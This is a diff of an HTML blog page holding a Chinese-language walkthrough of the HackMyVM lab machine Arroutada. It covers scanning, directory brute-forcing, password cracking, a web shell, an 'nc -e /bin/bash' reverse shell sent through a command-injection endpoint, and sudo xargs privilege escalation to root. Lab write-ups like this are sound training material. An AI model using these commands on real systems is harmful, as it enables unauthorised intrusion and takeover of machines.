@@ -7,18 +7,16 @@
     <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
     <script src='https://7r1UMPH.github.io/plugins/theme.js'></script>
     <link rel="icon" href="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250320200557660.ico">
-<meta name="description" content="# hmv_Arroutada
+<meta name="description" content="# 0.简介
 
-# 0.简介
-
-**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Arroutada  
-**难度**：绿色  
-**目标 IP**：192.168.205.151  
-**本机 IP**：192.168.205.128
+靶机：https://hackmyvm.eu/machines/machine.php?vm=Arroutada
+ 难度：绿色
+ 目标 IP：192.168.205.151
+ 本机 IP：192.168.205.128
 
 # 1.扫描
 
-​`nmap`​起手
+nmap起手
 
 ```
 ┌──(kali㉿kali)-[~/test]
@@ -53,7 +51,6 @@ Nmap done: 1 IP address (1 host up) scanned in 7.81 seconds
 ┌──(kali㉿kali)-[~/test]
 └─$ curl http://192.168.205.151
 <div align='center'><img src='imgs/apreton.png'></div>
-
 ```
 
 爆破目录
@@ -84,7 +81,6 @@ Progress: 598000 / 598005 (100.00%)
 ===============================================================                                                                      
 Finished
 ===============================================================
-
 ```
 
 查看/scout
@@ -109,7 +105,6 @@ J1.
 </p>
 </div>
 <!-- Stop please -->
-
 ```
 
 爆破
@@ -135,10 +130,9 @@ Total time: 59.22016
 Processed Requests: 119600
 Filtered Requests: 119599
 Requests/sec.: 2019.582
-
 ```
 
-![image](assets/image-20250208171240-95jvvsi.png)
+![image-20250331185406586](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331185406653.png)
 
 pass.txt是废话，直接下shellfile.ods，然后有密码，我们爆破一下
 
@@ -158,7 +152,6 @@ john11           (shellfile.ods)
 1g 0:00:00:08 DONE (2025-02-08 16:53) 0.1177g/s 1967p/s 1967c/s 1967C/s lachina..idiot
 Use the '--show --format=ODF' options to display all of the cracked passwords reliably
 Session completed. 
-
 ```
 
 打开给了我们一个路径/thejabasshell.php，点进去是空白的，所以我们进行爆破
@@ -226,7 +219,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 # 3. 获得稳定的 Shell
 
-获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：
+获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：
 
 ```bash
 script /dev/null -c bash  
@@ -385,10 +378,9 @@ www-data@arroutada:/tmp$ cat index.html
 <h6>This site is from ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>---.+++++++++++..<<++.>++.>-----------.++.++++++++.<+++++.>++++++++++++++.<+++++++++.---------.<.>>-----------------.-------.++.++++++++.------.+++++++++++++.+.<<+..</h6>
 
 <!-- Please sanitize /priv.php -->
-
 ```
 
-![image](assets/image-20250208171809-5xkbgq0.png)
+![image-20250331185429009](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331185429071.png)
 
 那我们看它提示的/priv.php
 
@@ -419,7 +411,6 @@ if (isset($data['command'])) {
 }
 
 */
-
 ```
 
 说我们少了参数，我们加上就好了
@@ -441,26 +432,21 @@ if (isset($data['command'])) {
 }
 
 */
-
 ```
 
 利用
 
 ```
 www-data@arroutada:/tmp$ wget --post-data='{'command':'nc 192.168.205.128 8888 -e /bin/bash'}' http://127.0.0.1:8000/priv.php -q -O -
-```
-
-```
 ┌──(kali㉿kali)-[~/test]
 └─$ nc -lvnp 8888           
 listening on [any] 8888 ...
 connect to [192.168.205.128] from (UNKNOWN) [192.168.205.151] 60268
 id
 uid=1001(drito) gid=1001(drito) groups=1001(drito)
-
 ```
 
-获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：
+获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：
 
 ```bash
 script /dev/null -c bash  
@@ -482,31 +468,28 @@ Matching Defaults entries for drito on arroutada:
 
 User drito may run the following commands on arroutada:
     (ALL : ALL) NOPASSWD: /usr/bin/xargs
-
 ```
 
 https://gtfobins.github.io/gtfobins/xargs/#sudo
 
-```
+```bash
 drito@arroutada:~/web$ sudo xargs -a /dev/null bash
 root@arroutada:/home/drito/web# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-‍。">
+<!-- ##{'timestamp':1739012133}## -->。">
 <meta property="og:title" content="hmv_Arroutada">
-<meta property="og:description" content="# hmv_Arroutada
+<meta property="og:description" content="# 0.简介
 
-# 0.简介
-
-**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Arroutada  
-**难度**：绿色  
-**目标 IP**：192.168.205.151  
-**本机 IP**：192.168.205.128
+靶机：https://hackmyvm.eu/machines/machine.php?vm=Arroutada
+ 难度：绿色
+ 目标 IP：192.168.205.151
+ 本机 IP：192.168.205.128
 
 # 1.扫描
 
-​`nmap`​起手
+nmap起手
 
 ```
 ┌──(kali㉿kali)-[~/test]
@@ -541,7 +524,6 @@ Nmap done: 1 IP address (1 host up) scanned in 7.81 seconds
 ┌──(kali㉿kali)-[~/test]
 └─$ curl http://192.168.205.151
 <div align='center'><img src='imgs/apreton.png'></div>
-
 ```
 
 爆破目录
@@ -572,7 +554,6 @@ Progress: 598000 / 598005 (100.00%)
 ===============================================================                                                                      
 Finished
 ===============================================================
-
 ```
 
 查看/scout
@@ -597,7 +578,6 @@ J1.
 </p>
 </div>
 <!-- Stop please -->
-
 ```
 
 爆破
@@ -623,10 +603,9 @@ Total time: 59.22016
 Processed Requests: 119600
 Filtered Requests: 119599
 Requests/sec.: 2019.582
-
 ```
 
-![image](assets/image-20250208171240-95jvvsi.png)
+![image-20250331185406586](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331185406653.png)
 
 pass.txt是废话，直接下shellfile.ods，然后有密码，我们爆破一下
 
@@ -646,7 +625,6 @@ john11           (shellfile.ods)
 1g 0:00:00:08 DONE (2025-02-08 16:53) 0.1177g/s 1967p/s 1967c/s 1967C/s lachina..idiot
 Use the '--show --format=ODF' options to display all of the cracked passwords reliably
 Session completed. 
-
 ```
 
 打开给了我们一个路径/thejabasshell.php，点进去是空白的，所以我们进行爆破
@@ -714,7 +692,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 # 3. 获得稳定的 Shell
 
-获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：
+获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：
 
 ```bash
 script /dev/null -c bash  
@@ -873,10 +851,9 @@ www-data@arroutada:/tmp$ cat index.html
 <h6>This site is from ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>---.+++++++++++..<<++.>++.>-----------.++.++++++++.<+++++.>++++++++++++++.<+++++++++.---------.<.>>-----------------.-------.++.++++++++.------.+++++++++++++.+.<<+..</h6>
 
 <!-- Please sanitize /priv.php -->
-
 ```
 
-![image](assets/image-20250208171809-5xkbgq0.png)
+![image-20250331185429009](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331185429071.png)
 
 那我们看它提示的/priv.php
 
@@ -907,7 +884,6 @@ if (isset($data['command'])) {
 }
 
 */
-
 ```
 
 说我们少了参数，我们加上就好了
@@ -929,26 +905,21 @@ if (isset($data['command'])) {
 }
 
 */
-
 ```
 
 利用
 
 ```
 www-data@arroutada:/tmp$ wget --post-data='{'command':'nc 192.168.205.128 8888 -e /bin/bash'}' http://127.0.0.1:8000/priv.php -q -O -
-```
-
-```
 ┌──(kali㉿kali)-[~/test]
 └─$ nc -lvnp 8888           
 listening on [any] 8888 ...
 connect to [192.168.205.128] from (UNKNOWN) [192.168.205.151] 60268
 id
 uid=1001(drito) gid=1001(drito) groups=1001(drito)
-
 ```
 
-获取**反向 shell** 后，通过以下命令获得稳定的**交互式** **TTY shell**：
+获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：
 
 ```bash
 script /dev/null -c bash  
@@ -970,18 +941,17 @@ Matching Defaults entries for drito on arroutada:
 
 User drito may run the following commands on arroutada:
     (ALL : ALL) NOPASSWD: /usr/bin/xargs
-
 ```
 
 https://gtfobins.github.io/gtfobins/xargs/#sudo
 
-```
+```bash
 drito@arroutada:~/web$ sudo xargs -a /dev/null bash
 root@arroutada:/home/drito/web# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-‍。">
+<!-- ##{'timestamp':1739012133}## -->。">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://7r1UMPH.github.io/post/hmv_Arroutada.html">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250320200605137.png">
@@ -1052,14 +1022,13 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
 </div>
     <div id="content">
-<div class="markdown-body" id="postBody"><h1>hmv_Arroutada</h1>
-<h1>0.简介</h1>
-<p><strong>靶机</strong>：<a href="https://hackmyvm.eu/machines/machine.php?vm=Arroutada" rel="nofollow">https://hackmyvm.eu/machines/machine.php?vm=Arroutada</a><br>
-<strong>难度</strong>：绿色<br>
-<strong>目标 IP</strong>：192.168.205.151<br>
-<strong>本机 IP</strong>：192.168.205.128</p>
+<div class="markdown-body" id="postBody"><h1>0.简介</h1>
+<p>靶机：<a href="https://hackmyvm.eu/machines/machine.php?vm=Arroutada" rel="nofollow">https://hackmyvm.eu/machines/machine.php?vm=Arroutada</a><br>
+难度：绿色<br>
+目标 IP：192.168.205.151<br>
+本机 IP：192.168.205.128</p>
 <h1>1.扫描</h1>
-<p>​<code class="notranslate">nmap</code>​起手</p>
+<p>nmap起手</p>
 <pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ nmap -A -Pn -n --min-rate 10000 192.168.205.151
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 16:47 CST
@@ -1089,7 +1058,6 @@ Nmap done: 1 IP address (1 host up) scanned in 7.81 seconds
 <pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ curl http://192.168.205.151
 &lt;div align="center"&gt;&lt;img src="imgs/apreton.png"&gt;&lt;/div&gt;
-
 </code></pre>
 <p>爆破目录</p>
 <pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
@@ -1117,7 +1085,6 @@ Progress: 598000 / 598005 (100.00%)
 ===============================================================                                                                      
 Finished
 ===============================================================
-
 </code></pre>
 <p>查看/scout</p>
 <pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
@@ -1139,7 +1106,6 @@ J1.
 &lt;/p&gt;
 &lt;/div&gt;
 &lt;!-- Stop please --&gt;
-
 </code></pre>
 <p>爆破</p>
 <pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
@@ -1162,9 +1128,8 @@ Total time: 59.22016
 Processed Requests: 119600
 Filtered Requests: 119599
 Requests/sec.: 2019.582
-
 </code></pre>
-<p><a target="_blank" rel="noopener noreferrer" href="assets/image-20250208171240-95jvvsi.png"><img src="assets/image-20250208171240-95jvvsi.png" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/e03563f5a6ee6e591203214626aa2537edbe767d0246923a12792b4003e7ab58/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303333313138353430363635332e706e67"><img src="https://camo.githubusercontent.com/e03563f5a6ee6e591203214626aa2537edbe767d0246923a12792b4003e7ab58/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303333313138353430363635332e706e67" alt="image-20250331185406586" data-canonical-src="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331185406653.png" style="max-width: 100%;"></a></p>
 <p>pass.txt是废话，直接下shellfile.ods，然后有密码，我们爆破一下</p>
 <pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ file shellfile.ods                                            
@@ -1181,7 +1146,6 @@ john11           (shellfile.ods)
 1g 0:00:00:08 DONE (2025-02-08 16:53) 0.1177g/s 1967p/s 1967c/s 1967C/s lachina..idiot
 Use the "--show --format=ODF" options to display all of the cracked passwords reliably
 Session completed. 
-
 </code></pre>
 <p>打开给了我们一个路径/thejabasshell.php，点进去是空白的，所以我们进行爆破</p>
 <pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
@@ -1240,7 +1204,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 </code></pre>
 <p>使用a参数弹个shell回来就好了</p>
 <h1>3. 获得稳定的 Shell</h1>
-<p>获取<strong>反向 shell</strong> 后，通过以下命令获得稳定的<strong>交互式</strong> <strong>TTY shell</strong>：</p>
+<p>获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">script /dev/null -c bash  
 ctrl+z  
 stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>  
@@ -1390,9 +1354,8 @@ www-data@arroutada:/tmp$ cat index.html
 &lt;h6&gt;This site is from ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;---.+++++++++++..&lt;&lt;++.&gt;++.&gt;-----------.++.++++++++.&lt;+++++.&gt;++++++++++++++.&lt;+++++++++.---------.&lt;.&gt;&gt;-----------------.-------.++.++++++++.------.+++++++++++++.+.&lt;&lt;+..&lt;/h6&gt;
 
 &lt;!-- Please sanitize /priv.php --&gt;
-
 </code></pre>
-<p><a target="_blank" rel="noopener noreferrer" href="assets/image-20250208171809-5xkbgq0.png"><img src="assets/image-20250208171809-5xkbgq0.png" alt="image" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/5422c9b3f50617c4656913369f5d3d0c0713c624f0ddc11054799848972734d6/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303333313138353432393037312e706e67"><img src="https://camo.githubusercontent.com/5422c9b3f50617c4656913369f5d3d0c0713c624f0ddc11054799848972734d6/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303333313138353432393037312e706e67" alt="image-20250331185429009" data-canonical-src="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331185429071.png" style="max-width: 100%;"></a></p>
 <p>那我们看它提示的/priv.php</p>
 <pre class="notranslate"><code class="notranslate">www-data@arroutada:/tmp$ wget http://127.0.0.1:8000/priv.php
 --2025-02-08 04:01:52--  http://127.0.0.1:8000/priv.php
@@ -1420,7 +1383,6 @@ if (isset($data['command'])) {
 }
 
 */
-
 </code></pre>
 <p>说我们少了参数，我们加上就好了</p>
 <pre class="notranslate"><code class="notranslate">www-data@arroutada:/tmp$ wget --post-data='{"command":"whoami"}' http://127.0.0.1:8000/priv.php -q -O -
@@ -1439,20 +1401,17 @@ if (isset($data['command'])) {
 }
 
 */
-
 </code></pre>
 <p>利用</p>
 <pre class="notranslate"><code class="notranslate">www-data@arroutada:/tmp$ wget --post-data='{"command":"nc 192.168.205.128 8888 -e /bin/bash"}' http://127.0.0.1:8000/priv.php -q -O -
-</code></pre>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+┌──(kali㉿kali)-[~/test]
 └─$ nc -lvnp 8888           
 listening on [any] 8888 ...
 connect to [192.168.205.128] from (UNKNOWN) [192.168.205.151] 60268
 id
 uid=1001(drito) gid=1001(drito) groups=1001(drito)
-
 </code></pre>
-<p>获取<strong>反向 shell</strong> 后，通过以下命令获得稳定的<strong>交互式</strong> <strong>TTY shell</strong>：</p>
+<p>获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">script /dev/null -c bash  
 ctrl+z  
 stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>  
@@ -1468,14 +1427,12 @@ Matching Defaults entries for drito on arroutada:
 
 User drito may run the following commands on arroutada:
     (ALL : ALL) NOPASSWD: /usr/bin/xargs
-
 </code></pre>
 <p><a href="https://gtfobins.github.io/gtfobins/xargs/#sudo" rel="nofollow">https://gtfobins.github.io/gtfobins/xargs/#sudo</a></p>
-<pre class="notranslate"><code class="notranslate">drito@arroutada:~/web$ sudo xargs -a /dev/null bash
+<div class="highlight highlight-source-shell"><pre class="notranslate">drito@arroutada:<span class="pl-k">~</span>/web$ sudo xargs -a /dev/null bash
 root@arroutada:/home/drito/web# id
-uid=0(root) gid=0(root) groups=0(root)
-</code></pre>
-<p>‍</p></div>
+uid=0(root) gid=0(root) groups=0(root)</pre></div>
+</div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
